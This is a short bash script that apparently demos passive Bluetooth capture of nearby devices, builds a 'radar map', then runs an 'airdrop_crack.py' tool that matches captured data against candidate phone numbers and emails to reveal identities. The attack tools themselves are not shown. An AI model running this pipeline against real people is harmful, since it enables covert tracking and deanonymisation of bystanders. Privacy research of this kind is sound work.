#!/bin/bash
# Full passive-observer demo: capture -> radar map -> identity crack.
# Prereq: ble_map compiled, candidates.txt holds phone/email candidates to test.
set -e
cd "$(dirname "$0")"
SECS=${1:-90}
echo "== [1/3] passive capture (${SECS}s) =="
./ble_map "$SECS" demo.jsonl | tee demo_session.txt | tail -5
echo "== [2/3] radar map =="
python3 mapgen.py demo.jsonl --out demo_map.md
echo "map: demo_map.md"
echo "== [3/3] identity crack =="
if [ -f candidates.txt ]; then
  python3 airdrop_crack.py --candidates candidates.txt --jsonl demo.jsonl
else
  echo "no candidates.txt — add phone/email candidates, one per line"
fi
